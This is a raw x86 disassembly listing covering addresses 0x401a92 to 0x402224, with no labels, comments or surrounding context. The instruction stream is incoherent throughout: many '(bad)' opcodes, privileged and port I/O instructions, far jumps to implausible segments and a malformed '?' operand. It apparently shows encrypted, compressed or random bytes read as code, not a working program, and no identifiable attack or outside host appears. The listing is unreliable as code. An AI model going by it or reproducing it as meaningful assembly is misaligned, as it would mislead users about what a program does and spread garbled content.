  401a92:	add    eax,0xd92285e2
  401a97:	or     BYTE PTR [edx],ah
  401a99:	jmp    DWORD PTR [eax-0x528b5f91]
  401a9f:	fadd   DWORD PTR [edi+ebx*8+0x49]
  401aa3:	fs xor ebp,eax
  401aa6:	xor    BYTE PTR [ecx+0x74d30191],dl
  401aac:	jg     0x401afa
  401aae:	sub    BYTE PTR [edi-0x6c968d07],ch
  401ab4:	push   ebp
  401ab5:	dec    edi
  401ab6:	adc    al,0x76
  401ab8:	pop    edi
  401ab9:	hlt    
  401aba:	aas    
  401abb:	inc    ebp
  401abc:	popf   
  401abd:	xor    eax,DWORD PTR [eax+eiz*8]
  401ac0:	and    BYTE PTR [ecx+ebx*2+0x6ea9679b],dl
  401ac7:	ret    
  401ac8:	test   ebx,ebp
  401aca:	pop    eax
  401acb:	jecxz  0x401ace
  401acd:	mov    ebx,0x4fa487e0
  401ad2:	(bad)
  401ad5:	mov    edi,0x2cbb8096
  401ada:	and    BYTE PTR [ecx+0xb79c1c],dh
  401ae0:	sbb    DWORD PTR [ebp+0x2d5f8473],edx
  401ae6:	dec    esp
  401ae7:	xchg   edx,eax
  401ae8:	dec    esi
  401ae9:	push   esi
  401aea:	dec    edx
  401aeb:	xchg   esp,eax
  401aec:	enter  0xa081,0x7a
  401af0:	and    ecx,DWORD PTR [ebx+ebp*8-0x2c]
  401af4:	pop    ss
  401af5:	sbb    BYTE PTR [ebx+0x737b5e76],ch
  401afb:	pusha  
  401afc:	or     BYTE PTR [edi],ch
  401afe:	ss in  eax,dx
  401b00:	addr16 (bad) 
  401b02:	scas   al,BYTE PTR es:[edi]
  401b03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b04:	and    ecx,DWORD PTR ds:0xde2bc60f
  401b0a:	nop
  401b0b:	inc    edx
  401b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b0d:	mov    edx,0xb6d73311
  401b12:	fcmovnbe st,st(1)
  401b14:	fucomip st,st(5)
  401b16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b17:	mov    dl,0x18
  401b19:	xor    DWORD PTR [eax-0x24],esp
  401b1c:	sti    
  401b1d:	pop    ss
  401b1e:	pop    ebx
  401b1f:	sub    edi,DWORD PTR [esp+edx*2-0x1c1c40a]
  401b26:	pop    esi
  401b27:	pop    edx
  401b28:	and    edx,DWORD PTR [esi]
  401b2a:	cwde   
  401b2b:	add    al,0x37
  401b2d:	dec    ebx
  401b2e:	jl     0x401ab3
  401b30:	sbb    DWORD PTR [edi+0x8],ebp
  401b33:	cmp    al,0xad
  401b35:	push   ebx
  401b36:	in     eax,dx
  401b37:	hlt    
  401b38:	mov    al,0x41
  401b3a:	aas    
  401b3b:	adc    eax,0xe92d0427
  401b40:	sub    BYTE PTR [edx+0x46],0xf2
  401b44:	sub    eax,0x7bc7396a
  401b49:	mov    dl,0xe3
  401b4b:	cmp    al,0x8e
  401b4d:	adc    DWORD PTR [edi],ebx
  401b4f:	pop    es
  401b50:	cdq    
  401b51:	dec    esi
  401b52:	inc    eax
  401b53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b54:	sub    ah,BYTE PTR ds:0x1f91aed0
  401b5a:	popf   
  401b5b:	out    dx,eax
  401b5c:	bound  esp,QWORD PTR [esi+0x4a]
  401b5f:	fs jmp 0x92e1:0xdbb06bfc
  401b67:	adc    edx,ebp
  401b69:	ss cdq 
  401b6b:	leave  
  401b6c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  401b6e:	push   DWORD PTR [esi]
  401b70:	push   0x1d
  401b72:	jmp    0x401b14
  401b74:	sub    ecx,edx
  401b76:	mov    esp,0x67eb0f94
  401b7b:	mov    ds:0x39a3accf,al
  401b80:	pop    esi
  401b81:	adc    edi,DWORD PTR [ebx+0x48]
  401b84:	into   
  401b85:	dec    ebp
  401b86:	retf   0xf900
  401b89:	(bad)  
  401b8a:	out    0x70,al
  401b8c:	lods   al,BYTE PTR ds:[esi]
  401b8d:	push   cs
  401b8e:	aam    0x94
  401b90:	jg     0x401b13
  401b92:	sbb    eax,0x20149baa
  401b97:	pop    edi
  401b98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b99:	ret    
  401b9a:	iret   
  401b9b:	fwait
  401b9c:	mov    al,0x1e
  401b9e:	adc    dl,bh
  401ba0:	adc    BYTE PTR ds:0x2ef4fb79,dl
  401ba6:	xchg   edx,eax
  401ba7:	and    BYTE PTR [esp+edx*1-0x4c],cl
  401bab:	xor    BYTE PTR [esi+ebp*2-0x2a],bh
  401baf:	mov    ah,0x5c
  401bb1:	sbb    DWORD PTR [edx+0x13],eax
  401bb4:	nop
  401bb5:	into   
  401bb6:	mov    DWORD PTR [edi],eax
  401bb8:	in     al,0xf7
  401bba:	in     al,dx
  401bbb:	leave  
  401bbc:	push   esp
  401bbd:	sbb    edi,DWORD PTR [edi+0x7cdf4f0d]
  401bc3:	in     al,0xa6
  401bc5:	mov    ebx,ebx
  401bc7:	pushf  
  401bc8:	mov    dh,0xe9
  401bca:	(bad)  
  401bcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bcd:	(bad)  
  401bce:	fisubr DWORD PTR [ebp+0x7e037238]
  401bd4:	iret   
  401bd5:	pop    edx
  401bd6:	pop    eax
  401bd7:	test   al,0xfa
  401bd9:	ja     0x401bac
  401bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bdc:	or     al,0x25
  401bde:	cmp    al,0xe8
  401be0:	es dec esp
  401be2:	cmp    BYTE PTR [ebx-0xe],0xd1
  401be6:	mov    ecx,0x64745432
  401beb:	mov    ds:0xc54649d6,eax
  401bf0:	sbb    BYTE PTR [ebp-0x70],bh
  401bf3:	sbb    BYTE PTR [edx+0x15a43d17],bl
  401bf9:	leave  
  401bfa:	jnp    0x401b9f
  401bfc:	call   0xa15017e7
  401c01:	fldcw  WORD PTR [ecx+0xe7c654c]
  401c07:	jecxz  0x401c67
  401c09:	sub    esp,DWORD PTR [ebx+0x7e]
  401c0c:	mov    dh,0xf
  401c0e:	les    esi,FWORD PTR [edx+0x5ea56362]
  401c14:	lods   eax,DWORD PTR ds:[esi]
  401c15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c16:	les    ecx,FWORD PTR [ecx+ecx*2]
  401c19:	(bad)  
  401c1a:	iret   
  401c1b:	(bad)  
  401c1c:	rcl    BYTE PTR [ebx+eax*1+0x3bd2481f],cl
  401c23:	je     0x401bfe
  401c25:	jecxz  0x401bc1
  401c27:	jp     0x401bf4
  401c29:	test   al,0xad
  401c2b:	and    esp,DWORD PTR [ebp+0x7b2984a7]
  401c31:	xchg   eax,ebp
  401c33:	jg     0x401bf3
  401c35:	xor    eax,0x3e74d7d2
  401c3a:	pop    edi
  401c3b:	or     DWORD PTR [ecx-0x3fb1b5ce],edx
  401c41:	sbb    DWORD PTR [eax],esi
  401c43:	mov    BYTE PTR [edi+eiz*4],bl
  401c46:	ficomp DWORD PTR [ebp+0x51]
  401c49:	retf   0x4844
  401c4c:	fstp   DWORD PTR [esi+0x49a27ae5]
  401c52:	scas   eax,DWORD PTR es:[edi]
  401c53:	cmp    ch,ch
  401c55:	inc    esp
  401c56:	mov    gs,WORD PTR [ecx+0x281d9476]
  401c5c:	xchg   esi,eax
  401c5d:	push   esp
  401c5e:	es sbb eax,0x7f97ea07
  401c64:	push   ss
  401c65:	mov    ebx,0x4dd9f5e2
  401c6a:	jge    0x401cc0
  401c6c:	idiv   DWORD PTR [esi]
  401c6e:	and    esi,DWORD PTR [esi]
  401c70:	iret   
  401c71:	pop    es
  401c72:	in     al,dx
  401c73:	pop    ds
  401c74:	push   cs
  401c75:	push   eax
  401c76:	in     al,dx
  401c77:	inc    ecx
  401c78:	push   es
  401c79:	mov    DWORD PTR [edx],ebx
  401c7b:	jge    0x401c2a
  401c7d:	rcl    BYTE PTR ds:0x7a580485,0xa4
  401c84:	arpl   WORD PTR [ebx],si
  401c86:	push   es
  401c87:	jo     0x401c7c
  401c89:	cdq    
  401c8a:	add    al,0xc2
  401c8c:	lock adc BYTE PTR [ebx+ecx*2+0x1c],cl
  401c91:	mov    dl,0xd7
  401c93:	cli    
  401c94:	and    al,0xf0
  401c96:	sub    DWORD PTR [eax+0x7af4b163],ebx
  401c9c:	(bad)  
  401c9d:	aas    
  401c9e:	push   0x54
  401ca0:	xchg   esp,eax
  401ca1:	xchg   ebp,eax
  401ca2:	nop
  401ca3:	push   ebp
  401ca4:	xor    cl,al
  401ca6:	inc    ebp
  401ca7:	mov    eax,DWORD PTR [eax+edi*1+0x6a]
  401cab:	xor    edi,DWORD PTR [esi+0x38fa2bba]
  401cb1:	jle    0x401c9a
  401cb3:	mov    bl,0xa3
  401cb5:	jge    0x401c6f
  401cb7:	cwde   
  401cb8:	daa    
  401cb9:	dec    edx
  401cba:	cmp    BYTE PTR [ecx+eax*2-0x79],dh
  401cbe:	cmp    al,BYTE PTR [ebx-0x71ebde6e]
  401cc4:	mov    dh,0x8a
  401cc6:	and    DWORD PTR [ebx-0x11],eax
  401cc9:	inc    esi
  401cca:	mov    dl,BYTE PTR ds:[ecx]
  401ccd:	js     0x401d05
  401ccf:	test   BYTE PTR [eax-0x1d4a9bb0],ah
  401cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cd6:	loopne 0x401c7d
  401cd8:	sbb    eax,DWORD PTR [esi+eax*1+0x41a77c36]
  401cdf:	stos   DWORD PTR es:[edi],eax
  401ce0:	jecxz  0x401c6f
  401ce2:	cwde   
  401ce3:	mov    ebx,0xa3702a49
  401ce8:	inc    eax
  401ce9:	in     al,dx
  401cea:	jmp    0xd12a4166
  401cef:	inc    edi
  401cf0:	pushf  
  401cf1:	mov    DWORD PTR [ebp-0x2d],ebx
  401cf4:	pop    edx
  401cf5:	push   ebx
  401cf6:	cwde   
  401cf7:	inc    eax
  401cf8:	inc    esp
  401cf9:	push   edx
  401cfa:	and    al,0x14
  401cfc:	cmp    BYTE PTR [esi],dl
  401cfe:	nop
  401cff:	fadd   QWORD PTR [edi+esi*4+0x65fb8136]
  401d06:	inc    eax
  401d07:	addr16 das 
  401d09:	push   ebp
  401d0a:	and    BYTE PTR [esp+esi*2+0x31],dh
  401d0e:	fst    QWORD PTR [ebx+0x778d0e95]
  401d14:	test   BYTE PTR [ebp-0x8],cl
  401d17:	loope  0x401cf0
  401d19:	das    
  401d1a:	xchg   edx,eax
  401d1b:	(bad)  
  401d1d:	out    dx,eax
  401d1e:	jns    0x401d0a
  401d20:	cmp    DWORD PTR [ebx],edx
  401d22:	xchg   ebx,eax
  401d23:	dec    eax
  401d24:	jle    0x401cfe
  401d26:	cmp    ch,BYTE PTR [ecx]
  401d28:	xor    ebx,DWORD PTR [edi+0x46fe5c39]
  401d2e:	shl    DWORD PTR ds:[ecx-0x1f],0xf4
  401d33:	or     al,0x85
  401d35:	pop    ss
  401d36:	push   edx
  401d37:	pop    esi
  401d38:	es ret 0x7b1f
  401d3c:	repz add DWORD PTR [eax+0x5d093367],0xffffff83
  401d44:	and    al,0x33
  401d46:	mov    esp,0x4208d7a4
  401d4b:	aad    0x89
  401d4d:	icebp  
  401d4e:	push   edi
  401d4f:	popf   
  401d50:	cli    
  401d51:	pop    eax
  401d52:	std    
  401d53:	lock fs cmp eax,0x64624e87
  401d5a:	or     eax,0x4bc9174a
  401d5f:	xor    BYTE PTR [eax+0x6f],dh
  401d62:	jnp    0x401dd3
  401d64:	xor    esp,DWORD PTR [ebx-0x1e]
  401d67:	sub    eax,0xde74f922
  401d6c:	shl    ebx,0x30
  401d6f:	adc    eax,0x4bdab3a3
  401d74:	inc    ebx
  401d75:	mov    ecx,DWORD PTR [eax+edx*4-0x75]
  401d79:	ret    0xd2df
  401d7c:	(bad)  
  401d7d:	mov    cl,0x5c
  401d7f:	and    al,0x1d
  401d81:	dec    edi
  401d82:	test   eax,0xb7b11175
  401d87:	arpl   WORD PTR [eax-0x16747a05],cx
  401d8d:	das    
  401d8e:	lds    edx,FWORD PTR [ecx+0x17]
  401d91:	mov    WORD PTR [ebp+0x6d99b53d],fs
  401d97:	pushf  
  401d98:	and    BYTE PTR [ecx],ch
  401d9a:	fisttp QWORD PTR [ebx]
  401d9c:	into   
  401d9d:	shl    eax,cl
  401d9f:	add    eax,0xc40629f8
  401da5:	mov    eax,0xe5753214
  401daa:	dec    edi
  401dab:	retf   
  401dac:	xchg   edi,eax
  401dad:	fdecstp 
  401daf:	add    eax,0x3c0b3655
  401db4:	and    eax,0xe5521db6
  401db9:	add    edx,DWORD PTR [eax-0x21bbb49]
  401dbf:	inc    edi
  401dc0:	jg     0x401da3
  401dc2:	js     0x401db6
  401dc4:	jle    0x401de7
  401dc6:	loopne 0x401db2
  401dc8:	stos   BYTE PTR es:[edi],al
  401dc9:	sar    BYTE PTR [esi+0x59],cl
  401dcc:	xor    BYTE PTR [esi-0x298c6cf],0x19
  401dd3:	(bad)  
  401dd4:	inc    esp
  401dd5:	sub    ecx,edx
  401dd7:	fdiv   st(1),st
  401dd9:	and    DWORD PTR [esi+esi*1+0x15],0x15
  401dde:	mov    ebx,0x7a67b51c
  401de3:	add    ebx,DWORD PTR [ecx+0x2c68785d]
  401de9:	sahf   
  401dea:	mov    bl,0x60
  401dec:	pop    ds
  401ded:	clc    
  401dee:	mov    DWORD PTR [ebp-0x59],0xf83d6328
  401df5:	gs ins DWORD PTR es:[edi],dx
  401df7:	push   edx
  401df8:	fidiv  WORD PTR [ebx+0x2b]
  401dfb:	inc    edi
  401dfc:	xchg   edi,eax
  401dfd:	rcr    DWORD PTR [edx-0xc],1
  401e00:	mov    ecx,DWORD PTR [ecx]
  401e02:	rcr    dl,cl
  401e04:	test   BYTE PTR [ecx+0x3],dh
  401e07:	push   cs
  401e08:	dec    ebp
  401e09:	test   al,0xed
  401e0b:	or     ecx,DWORD PTR [ecx]
  401e0d:	scas   eax,DWORD PTR es:[edi]
  401e0e:	ins    DWORD PTR es:[edi],dx
  401e0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e10:	cmp    eax,0xc3adb5ea
  401e15:	imul   eax,DWORD PTR [ecx+0x4c63702a],0x3b
  401e1c:	cld    
  401e1d:	add    ah,0x23
  401e20:	jge    0x401e47
  401e22:	loop   0x401dca
  401e24:	adc    al,0x62
  401e26:	ins    BYTE PTR es:[edi],dx
  401e27:	adc    bl,BYTE PTR [ebx+0x64]
  401e2a:	(bad)  [edi-0x52]
  401e2d:	dec    edi
  401e2e:	cmp    edi,DWORD PTR [edx-0x556f7d6f]
  401e34:	dec    esp
  401e35:	and    BYTE PTR [edx],cl
  401e37:	pop    edx
  401e38:	mov    bl,0xa2
  401e3a:	daa    
  401e3b:	xor    al,0x4f
  401e3d:	in     al,dx
  401e3e:	loopne 0x401ea5
  401e40:	add    al,0x4c
  401e42:	xchg   edx,eax
  401e43:	ins    DWORD PTR es:[edi],dx
  401e44:	adc    eax,esp
  401e46:	jbe    0x401e42
  401e48:	mov    ?,WORD PTR [ebx]
  401e4a:	rcl    esp,0xd0
  401e4d:	aas    
  401e4e:	ins    WORD PTR es:[edi],dx
  401e50:	sbb    ah,ah
  401e52:	cmc    
  401e53:	mov    al,0xe3
  401e55:	je     0x401df4
  401e57:	push   esp
  401e58:	outs   dx,DWORD PTR ds:[esi]
  401e59:	sar    DWORD PTR [ecx],0x40
  401e5c:	rcr    BYTE PTR [eax-0x4f],cl
  401e5f:	loopne 0x401de3
  401e61:	lock xchg esp,eax
  401e63:	add    eax,0xda197b06
  401e68:	repnz fdiv DWORD PTR ds:[eax]
  401e6c:	fiadd  WORD PTR [edx+ebp*2]
  401e6f:	loope  0x401e4f
  401e71:	add    eax,0xa85235bc
  401e76:	call   0x4e0b:0xe9ae185d
  401e7d:	(bad)  
  401e7e:	push   0xdcdf75dd
  401e83:	xor    DWORD PTR [esi],esi
  401e85:	sti    
  401e86:	push   cs
  401e87:	neg    BYTE PTR ss:[ebp-0x15]
  401e8b:	inc    edx
  401e8c:	outs   dx,BYTE PTR ds:[esi]
  401e8d:	sbb    BYTE PTR [ebx],bh
  401e8f:	dec    edx
  401e90:	sti    
  401e91:	ret    
  401e92:	jle    0x401e97
  401e94:	xor    BYTE PTR [esi-0x64],bl
  401e97:	mov    bl,0x43
  401e99:	cmp    al,0xf9
  401e9b:	out    dx,al
  401e9c:	add    eax,0x8d276118
  401ea1:	cmp    eax,DWORD PTR [eax]
  401ea3:	into   
  401ea4:	mov    cl,BYTE PTR [esi]
  401ea6:	pusha  
  401ea7:	pop    edi
  401ea8:	cdq    
  401ea9:	ss mov dl,0x2d
  401eac:	mov    esp,0x5595b904
  401eb1:	or     bh,dh
  401eb3:	jle    0x401ee0
  401eb5:	cmc    
  401eb6:	ret    
  401eb7:	fs jmp 0x401ecc
  401eba:	das    
  401ebb:	sub    al,0xec
  401ebd:	add    al,0xd4
  401ebf:	adc    al,0x20
  401ec1:	mov    dl,0xa2
  401ec3:	push   ds
  401ec4:	push   eax
  401ec5:	xor    edx,edi
  401ec7:	stc    
  401ec8:	jnp    0x401f04
  401eca:	jmp    0x3c5b3eb7
  401ecf:	gs jp  0x401ee5
  401ed2:	adc    al,BYTE PTR [edi+0x10]
  401ed5:	xor    BYTE PTR [ecx-0x18],0xbf
  401ed9:	sar    DWORD PTR [esi+esi*2+0x67],0xa4
  401ede:	mov    eax,ds:0x749ed1b6
  401ee3:	test   ah,ch
  401ee5:	in     eax,0x2a
  401ee7:	es scas al,BYTE PTR es:[edi]
  401ee9:	mov    WORD PTR [esi+0x2698e652],ds
  401eef:	xchg   esi,eax
  401ef0:	bound  ecx,QWORD PTR [ebx-0x61]
  401ef3:	test   eax,0x191b7331
  401ef8:	push   es
  401ef9:	xor    ecx,eax
  401efb:	inc    edi
  401efc:	stc    
  401efd:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401eff:	adc    esi,DWORD PTR [edx+0x27b21ab6]
  401f05:	pop    esi
  401f06:	jns    0x401ec1
  401f08:	stos   BYTE PTR es:[edi],al
  401f09:	adc    DWORD PTR [eax+esi*2-0x79],0x29
  401f0e:	icebp  
  401f0f:	sti    
  401f10:	mov    ecx,0x113235ec
  401f15:	bound  ebx,QWORD PTR ds:0xe5a7726d
  401f1b:	aam    0xf
  401f1d:	adc    ebp,DWORD PTR [ebp-0x80]
  401f20:	stc    
  401f21:	jb     0x401f2e
  401f23:	lods   al,BYTE PTR ds:[esi]
  401f24:	js     0x401f85
  401f26:	div    DWORD PTR [edi+0x2a0635e7]
  401f2c:	inc    eax
  401f2d:	inc    ebx
  401f2e:	xlat   BYTE PTR ds:[ebx]
  401f2f:	mov    ah,0x91
  401f31:	cmp    DWORD PTR [esi],esi
  401f33:	mov    esi,ebp
  401f35:	mov    ebx,0x890c9671
  401f3a:	out    0xda,eax
  401f3c:	lods   eax,DWORD PTR ds:[esi]
  401f3d:	push   ss
  401f3e:	test   BYTE PTR [eax-0x1c0cf08b],al
  401f44:	repnz add BYTE PTR [edx-0x27],bh
  401f48:	sub    eax,0x30cf0597
  401f4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f4e:	aad    0x9
  401f50:	xchg   ebp,eax
  401f51:	ins    BYTE PTR es:[edi],dx
  401f52:	jecxz  0x401ee8
  401f54:	test   DWORD PTR [ecx-0x503a0d3f],edi
  401f5a:	push   ss
  401f5b:	cmp    edx,DWORD PTR ds:0x87e1bc06
  401f61:	xchg   esi,eax
  401f62:	push   ss
  401f63:	sbb    BYTE PTR [edx+0x57b85750],dh
  401f69:	loope  0x401f4d
  401f6b:	rcr    DWORD PTR [ecx-0x4c248b08],cl
  401f71:	xor    BYTE PTR [esi],0xc1
  401f74:	ror    BYTE PTR ds:0x39207dd3,0x8
  401f7b:	(bad)  
  401f7c:	inc    eax
  401f7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f7e:	setg   BYTE PTR [ecx]
  401f81:	jmp    0xc99b:0xdf7e3383
  401f88:	mov    al,ds:0x68ea0e00
  401f8d:	fld1   
  401f8f:	jno    0x401f89
  401f91:	and    DWORD PTR [edi],ecx
  401f93:	out    dx,eax
  401f94:	outs   dx,DWORD PTR ds:[esi]
  401f95:	mov    esi,0x728c7ac1
  401f9a:	dec    eax
  401f9b:	(bad)
  401f9f:	loope  0x401f8d
  401fa1:	jg     0x401f73
  401fa3:	(bad)  
  401fa5:	les    ebp,FWORD PTR [eax+0x36]
  401fa8:	ins    DWORD PTR es:[edi],dx
  401fa9:	jle    0x401fb3
  401fab:	test   ebp,edi
  401fad:	pop    ds
  401fae:	push   ebx
  401faf:	dec    edi
  401fb0:	fsubr  QWORD PTR [esi+0xd905fd]
  401fb6:	sbb    al,0x7
  401fb8:	push   0x69908dea
  401fbd:	inc    ebx
  401fbe:	adc    bh,cl
  401fc0:	aad    0xf0
  401fc2:	in     eax,0x49
  401fc4:	and    al,0xe
  401fc6:	in     eax,0xad
  401fc8:	adc    al,0xae
  401fca:	into   
  401fcb:	pop    ebp
  401fcc:	adc    ah,BYTE PTR [eax]
  401fce:	popf   
  401fcf:	xchg   ebp,eax
  401fd0:	mov    edx,0xa0c389a0
  401fd5:	jno    0x402018
  401fd7:	(bad)  
  401fd8:	and    ecx,DWORD PTR [edi+0x1a]
  401fdb:	mov    al,0x62
  401fdd:	(bad)  
  401fde:	ins    BYTE PTR es:[edi],dx
  401fdf:	and    ebx,esp
  401fe1:	mov    dh,0xc8
  401fe3:	es mov ebx,0xce8a2e89
  401fe9:	jl     0x401ff9
  401feb:	pop    esi
  401fec:	add    bl,BYTE PTR [edx+ecx*2]
  401fef:	scas   eax,DWORD PTR es:[edi]
  401ff0:	cmp    eax,0xad644942
  401ff5:	mul    DWORD PTR ds:0xc7bf4c53
  401ffb:	adc    BYTE PTR [esp+edx*2-0x49],bl
  401fff:	lods   eax,DWORD PTR ds:[esi]
  402000:	jge    0x402011
  402002:	lock out dx,al
  402004:	add    edi,DWORD PTR [edx]
  402006:	dec    eax
  402007:	mov    dl,0x1
  402009:	cmp    esp,esp
  40200b:	fsubr  DWORD PTR [edx+0x20bb8f4d]
  402011:	rcl    esp,0x45
  402014:	jno    0x402024
  402016:	mov    ds:0xcd76398b,eax
  40201b:	jp     0x402007
  40201d:	aam    0xff
  40201f:	repz xor bl,bl
  402022:	cld    
  402023:	and    al,0x89
  402025:	pop    es
  402026:	mov    bh,0x1
  402028:	dec    eax
  402029:	int    0x4d
  40202b:	xchg   BYTE PTR [edx+0x49b7edbd],bh
  402031:	sar    eax,0xdb
  402034:	push   edx
  402035:	push   es
  402036:	sub    BYTE PTR [ebp-0x1cdd59cd],ah
  40203c:	mul    bl
  40203e:	daa    
  40203f:	push   ss
  402040:	lock pop ss
  402042:	and    esp,ebp
  402044:	mov    ebx,edx
  402046:	dec    ebp
  402047:	xchg   bl,bh
  402049:	sbb    esi,DWORD PTR [ebp-0x77]
  40204c:	ins    DWORD PTR es:[edi],dx
  40204d:	das    
  40204e:	push   ebp
  40204f:	lahf   
  402050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402051:	popf   
  402052:	or     esi,DWORD PTR [ebx+ecx*1-0x8244bb1]
  402059:	and    DWORD PTR [eax],edi
  40205b:	jmp    0xc2ba058b
  402060:	pop    ds
  402061:	test   BYTE PTR [esi+0x75],ch
  402064:	push   edi
  402065:	mov    bh,0xa0
  402067:	cwde   
  402068:	dec    esp
  402069:	inc    ecx
  40206a:	sub    dl,dl
  40206c:	inc    ebx
  40206d:	adc    DWORD PTR [eax-0x15],ebp
  402070:	jns    0x4020c3
  402072:	push   ebx
  402073:	aas    
  402074:	mov    edx,eax
  402076:	jmp    0x4d5adeef
  40207b:	sub    eax,0xd552ef0f
  402080:	push   ds
  402081:	fwait
  402082:	mov    eax,ds:0x2bc209c4
  402087:	sti    
  402088:	add    al,ah
  40208a:	cmp    eax,0x5dd963a2
  40208f:	add    al,0x67
  402091:	inc    esp
  402092:	cdq    
  402093:	mov    ds:0xcfdd4d3a,al
  402098:	je     0x40203d
  40209a:	xchg   ebx,eax
  40209b:	in     eax,0xd6
  40209d:	mov    dl,0x54
  40209f:	fdivr  st(5),st
  4020a1:	and    bl,BYTE PTR [eax-0x71d944bd]
  4020a7:	arpl   WORD PTR [edi+0x20c5ed3],sp
  4020ad:	cs sbb eax,0x7b112b7c
  4020b3:	add    eax,0x31ef4ebe
  4020b8:	jns    0x402109
  4020ba:	in     eax,0x37
  4020bc:	aad    0xb3
  4020be:	or     BYTE PTR [edi+0xf],0xcc
  4020c2:	je     0x4020bd
  4020c4:	stos   BYTE PTR es:[edi],al
  4020c5:	imul   edx,DWORD PTR [esi+0x4a],0x54cbd702
  4020cc:	leave  
  4020cd:	scas   al,BYTE PTR es:[edi]
  4020ce:	mov    bl,0x41
  4020d0:	jmp    0x402126
  4020d2:	or     bl,0xb8
  4020d5:	and    dl,al
  4020d7:	jmp    0x369c:0x7cfec3b6
  4020de:	adc    bh,0xc4
  4020e1:	cwde   
  4020e2:	std    
  4020e3:	cmp    bh,BYTE PTR [eax+0x3a]
  4020e6:	mov    edx,0x421e31f
  4020ec:	in     eax,0xe2
  4020ee:	inc    edx
  4020ef:	add    DWORD PTR [ebp-0x4b],ebp
  4020f2:	sub    al,0xf4
  4020f4:	cdq    
  4020f5:	fdiv   DWORD PTR [edx]
  4020f7:	jmp    0x402105
  4020f9:	push   es
  4020fa:	pop    ebx
  4020fb:	push   edi
  4020fc:	les    ebp,FWORD PTR [ecx-0x24fc7884]
  402102:	mov    DWORD PTR [edx+0x6f313914],ebp
  402108:	adc    DWORD PTR [edx-0x675ba853],eax
  40210e:	jle    0x402153
  402110:	ins    DWORD PTR es:[edi],dx
  402111:	sub    al,0x81
  402113:	adc    DWORD PTR [edi+0x12],0xc5de88f3
  40211a:	sub    al,0x38
  40211c:	nop
  40211d:	or     ah,BYTE PTR [eax]
  40211f:	add    ebx,ecx
  402121:	mov    edx,0x57ce6a82
  402126:	add    DWORD PTR [edx+esi*8],ebx
  402129:	sub    eax,0xa7f59b90
  40212e:	sahf   
  40212f:	adc    al,0xeb
  402131:	stos   BYTE PTR es:[edi],al
  402132:	adc    BYTE PTR [ecx-0x1a],dh
  402135:	test   edi,ebp
  402137:	adc    esi,eax
  402139:	push   esi
  40213a:	sub    dh,BYTE PTR [ebp+0x49]
  40213d:	out    dx,eax
  40213e:	xor    al,0xa6
  402140:	pop    esp
  402141:	in     eax,0x5e
  402143:	mov    dh,ah
  402145:	iret   
  402146:	pop    esp
  402147:	or     ebx,esp
  402149:	imul   DWORD PTR [eax-0x3f]
  40214c:	test   eax,0xc0adb6fe
  402151:	inc    eax
  402152:	dec    ebx
  402153:	imul   esp,DWORD PTR [ebx+eax*8-0x59],0xb59399f2
  40215b:	or     eax,0x6b5d0953
  402160:	outs   dx,BYTE PTR ds:[esi]
  402161:	pop    ebx
  402162:	cdq    
  402163:	or     cl,dl
  402165:	sbb    al,0xe9
  402167:	shl    DWORD PTR [ebx-0x527c0124],0xb8
  40216e:	je     0x40219f
  402170:	and    edx,DWORD PTR [edx+0x20ad811c]
  402176:	pop    esp
  402177:	sbb    eax,0x666fd2f5
  40217c:	sbb    al,0x37
  40217e:	or     ch,BYTE PTR [ebp-0x23]
  402181:	jl     0x4021a9
  402183:	mov    bh,BYTE PTR [ebx-0x4cb21342]
  402189:	stos   BYTE PTR es:[edi],al
  40218a:	mov    ebp,0x3a426e36
  40218f:	add    esp,DWORD PTR [edi]
  402191:	xchg   edi,eax
  402192:	mov    al,ds:0x2945e7b
  402197:	lock add edx,DWORD PTR [ecx+0x5e]
  40219b:	sbb    dh,BYTE PTR [esi+0x5b85f6ef]
  4021a1:	pop    eax
  4021a2:	adc    BYTE PTR [ecx],0x39
  4021a5:	dec    esi
  4021a6:	inc    edx
  4021a7:	add    al,0xa4
  4021a9:	jp     0x40212e
  4021ab:	sbb    BYTE PTR [eax+0x66eb2eb3],bl
  4021b1:	or     eax,0xfdb2b57b
  4021b7:	mov    ch,0x9a
  4021b9:	xchg   ebp,eax
  4021ba:	cs mov al,dh
  4021bd:	jo     0x40216f
  4021bf:	jne    0x402156
  4021c1:	gs mov ecx,0xc8eef9e4
  4021c7:	dec    eax
  4021c8:	std    
  4021c9:	mov    ebp,0x415ab7d2
  4021ce:	sub    DWORD PTR [esi+0x7ab8101f],edi
  4021d4:	js     0x402238
  4021d6:	repnz daa 
  4021d8:	sub    eax,DWORD PTR [esi-0x73ddc7a1]
  4021de:	repz int 0xfa
  4021e1:	cld    
  4021e2:	jno    0x40218e
  4021e4:	or     BYTE PTR [edi+edi*2],al
  4021e7:	sub    ebx,eax
  4021e9:	outs   dx,BYTE PTR ds:[esi]
  4021ea:	push   esp
  4021eb:	aam    0x38
  4021ed:	outs   dx,DWORD PTR ds:[esi]
  4021ee:	add    eax,DWORD PTR [ebx]
  4021f0:	sbb    ebx,esp
  4021f2:	sub    eax,0x3ea1b44f
  4021f7:	(bad)  
  4021f8:	pop    ebx
  4021f9:	adc    al,0x2c
  4021fb:	popa   
  4021fc:	cmp    dh,ch
  4021fe:	pusha  
  4021ff:	jmp    0xedf73f74
  402204:	shl    DWORD PTR [esi],cl
  402206:	or     ch,BYTE PTR [esi+0x3693e03d]
  40220c:	fmul   QWORD PTR [eax-0x5d7f466f]
  402212:	out    dx,eax
  402213:	cmp    eax,0x14ed90a0
  402218:	bound  edx,QWORD PTR [eax-0x12]
  40221b:	mov    ah,0x49
  40221d:	mov    esi,0x3e9cd93c
  402222:	aad    0x2a
  402224:	cmc    
